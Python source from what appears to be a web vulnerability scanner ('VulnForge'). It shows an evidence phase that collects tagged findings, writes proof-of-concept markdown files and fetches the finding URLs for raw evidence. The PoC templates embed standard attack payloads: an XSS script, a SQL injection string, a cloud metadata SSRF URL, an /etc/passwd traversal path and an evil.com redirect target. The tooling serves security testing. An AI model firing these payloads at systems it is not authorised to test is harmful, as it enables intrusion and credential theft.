        "[auth-bypass]",
        "[authz]",
        "[cache-poison]",
        "[wcd]",
        "[lfi]",
        "[path-traversal]",
        "[smuggling]",
        "[h2-",
        "[h3-",
        "[ws-",
        "[cswsh]",
        "[graphql-",
    ):
        if line.lower().startswith(prefix):
            rest = line[len(prefix) :].strip()
            parts = rest.split(" - ", 1)
            if len(parts) > 1:
                return parts[1].strip()
    return line.strip()


def _generate_poc_xss(line: str, url: Optional[str], timestamp: str) -> str:
    return f"# XSS PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Payload\n<script>alert(1)</script>\n## Timestamp\n{timestamp}\n"


def _generate_poc_sql(line: str, url: Optional[str], timestamp: str) -> str:
    return f"# SQL Injection PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Payload\n' OR 1=1 --\n## Timestamp\n{timestamp}\n"


def _generate_poc_ssrf(line: str, url: Optional[str], timestamp: str) -> str:
    return f"# SSRF PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Payload\nhttp://169.254.169.254/latest/meta-data/\n## Timestamp\n{timestamp}\n"


def _generate_poc_idor(line: str, url: Optional[str], timestamp: str) -> str:
    return f"# IDOR PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Notes\nChange numeric ID in URL to access other resources.\n## Timestamp\n{timestamp}\n"


def _generate_poc_redirect(line: str, url: Optional[str], timestamp: str) -> str:
    return f"# Open Redirect PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Payload\nhttps://evil.com\n## Timestamp\n{timestamp}\n"


def _generate_poc_auth_bypass(line: str, url: Optional[str], timestamp: str) -> str:
    return f"# Auth Bypass PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Timestamp\n{timestamp}\n"


def _generate_poc_cache_poison(line: str, url: Optional[str], timestamp: str) -> str:
    return f"# Cache Poisoning PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Timestamp\n{timestamp}\n"


def _generate_poc_lfi(line: str, url: Optional[str], timestamp: str) -> str:
    return f"# LFI PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Payload\n../../../../etc/passwd\n## Timestamp\n{timestamp}\n"


def _generate_poc_smuggling(line: str, url: Optional[str], timestamp: str) -> str:
    return (
        f"# Smuggling PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Timestamp\n{timestamp}\n"
    )


def _generate_poc_websocket(line: str, url: Optional[str], timestamp: str) -> str:
    return (
        f"# WebSocket PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Timestamp\n{timestamp}\n"
    )


def _generate_poc_graphql(line: str, url: Optional[str], timestamp: str) -> str:
    return f"# GraphQL PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Query\n{{ __typename }}\n## Timestamp\n{timestamp}\n"


def _generate_poc_generic(line: str, url: Optional[str], timestamp: str, ftype: str) -> str:
    label = _finding_type_label(ftype)
    return f"# {label} PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Timestamp\n{timestamp}\n"


def _generate_poc_content(
    line: str,
    finding_type: str,
    url: Optional[str],
    timestamp: str,
    phase_name: str,
) -> str:
    if finding_type == "xss":
        return _generate_poc_xss(line, url, timestamp)
    if finding_type == "sql-injection":
        return _generate_poc_sql(line, url, timestamp)
    if finding_type == "ssrf":
        return _generate_poc_ssrf(line, url, timestamp)
    if finding_type == "idor":
        return _generate_poc_idor(line, url, timestamp)
    if finding_type == "open-redirect":
        return _generate_poc_redirect(line, url, timestamp)
    if finding_type == "auth-bypass":
        return _generate_poc_auth_bypass(line, url, timestamp)
    if finding_type == "cache-poison":
        return _generate_poc_cache_poison(line, url, timestamp)
    if finding_type == "lfi":
        return _generate_poc_lfi(line, url, timestamp)
    if finding_type == "smuggling":
        return _generate_poc_smuggling(line, url, timestamp)
    if finding_type == "websocket":
        return _generate_poc_websocket(line, url, timestamp)
    if finding_type == "graphql":
        return _generate_poc_graphql(line, url, timestamp)
    if finding_type == "ssti":
        return _generate_poc_generic(line, url, timestamp, "ssti")
    return _generate_poc_generic(line, url, timestamp, finding_type)


def _generate_poc_index(poc_dir: Path, entries: List[Dict[str, str]]) -> None:
    if not entries:
        ensure(poc_dir / "README.md").write_text(
            "# Proofs of Concept\n\nNo PoCs were generated during this scan.\n"
        )
        return
    lines = [
        "# Proofs of Concept\n",
        f"**Total PoCs:** {len(entries)}\n",
        f"**Generated:** {datetime.now().isoformat(timespec='seconds')}\n",
        "---\n",
        "| # | PoC ID | Type | URL | Source Phase |\n",
        "|---|--------|------|-----|-------------|\n",
    ]
    for i, entry in enumerate(entries, 1):
        url_display = (entry["url"][:80] + "...") if len(entry["url"]) > 80 else entry["url"]
        lines.append(
            f"| {i} | [{entry['id']}]({entry['file']}) "
            f"| {entry['type']} "
            f"| `{url_display}` "
            f"| {entry['phase']} |\n"
        )
    lines.extend(
        [
            "\n---\n",
            "*Generated by VulnForge Evidence Collector*\n",
        ]
    )
    ensure(poc_dir / "README.md").write_text("".join(lines))


async def phase_45_EVIDENCE(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"45-EVIDENCE"}:
        return {}
    _out = outdir / "evidence.txt"
    if _out.exists() and not force:
        return {"45-EVIDENCE": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 45-EVIDENCE: capture evidence and generate structured PoCs")
    findings: List[str] = []
    _ev_urlopen = _get_urlopener()
    _ev_extra_headers = _extra_headers_dict()
    evidence_dir = ensure(outdir / "evidence_payloads")
    poc_dir = outdir / "evidence" / "poc"
    poc_dir.mkdir(parents=True, exist_ok=True)

    # Expanded finding prefixes
    finding_prefixes = [
        "[finding]",
        "[confirmed]",
        "[lfi-confirmed]",
        "[credential-hit]",
        "[idor]",
        "[credential-exfil]",
        "[sql-injection]",
        "[xss]",
        "[ssti]",
        "[ssrf]",
        "[massassign]",
        "[idor-massassign]",
        "[domxss]",
        "[sqlmap]",
        "[ssrf-meta]",
        "[open-redirect]",
        "[redirect]",
        "[auth-bypass]",
        "[authz]",
        "[cache-poison]",
        "[wcd]",
        "[lfi]",
        "[path-traversal]",
        "[smuggling]",
        "[h2-",
        "[h3-",
        "[ws-",
        "[cswsh]",
        "[graphql-",
    ]

    poc_index_entries: List[Dict[str, str]] = []
    poc_counter = 0

    for txt_file in sorted(outdir.glob("*.txt")):
        phase_name = txt_file.stem
        lines = read_lines(txt_file)
        if not lines:
            continue
        captured = 0
        for ln in lines:
            if any(ln.startswith(prefix) for prefix in finding_prefixes):
                timestamp = datetime.now().isoformat(timespec="seconds")
                findings.append(f"[{timestamp}] {phase_name}: {ln}")
                captured += 1
                poc_counter += 1
                finding_id = f"{_safe_name(phase_name)}_{poc_counter}"
                finding_type = _detect_finding_type(ln)
                url = _extract_url_from_line(ln)

                # Generate structured PoC file
                poc_content = _generate_poc_content(ln, finding_type, url, timestamp, phase_name)
                poc_file = poc_dir / f"poc_{finding_id}.md"
                poc_file.write_text(poc_content)
                findings.append(f"  PoC generated → {poc_file}")
                poc_index_entries.append(
                    {
                        "id": finding_id,
                        "type": finding_type,
                        "url": url or "N/A",
                        "file": f"poc_{finding_id}.md",
                        "phase": phase_name,
                    }
                )

                # Also attempt to fetch the URL for raw evidence (keep existing behavior)
                for token in ln.split():
                    if token.startswith("http") and "?" in token:
                        evidence_file = evidence_dir / f"{_safe_name(phase_name)}_{captured}.txt"
                        try:
                            req = urllib.request.Request(
                                token,
                                method="GET",
                                headers={"User-Agent": "Mozilla/5.0", **_ev_extra_headers},
                            )
                            ev_status, ev_headers, ev_body = await _async_urlopen(
                                _ev_urlopen, req, timeout=10
                            )
                            ev_body_text = ev_body.decode("utf-8", errors="ignore")
                            evidence_file.write_text(
                                f"URL: {token}\n"
                                f"Status: {ev_status}\n"
                                f"Headers: {dict(ev_headers)}\n"
                                f"Body:\n{ev_body_text[:5000]}\n"
                            )
                            findings.append(f"  evidence saved → {evidence_file}")
                        except asyncio.CancelledError:
                            raise
                        except Exception:
                            pass
                        break
        if captured > 0:
            findings.append(f"  [{phase_name}] {captured} finding(s) captured")

    # Generate PoC index
    _generate_poc_index(poc_dir, poc_index_entries)

    if not findings:
        findings.append("[result] No finding markers found across phase outputs")

    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"45-EVIDENCE: {len(findings)} evidence entries, {poc_counter} PoCs → {out}")
    return {"45-EVIDENCE": str(_out), "count": len(findings)}
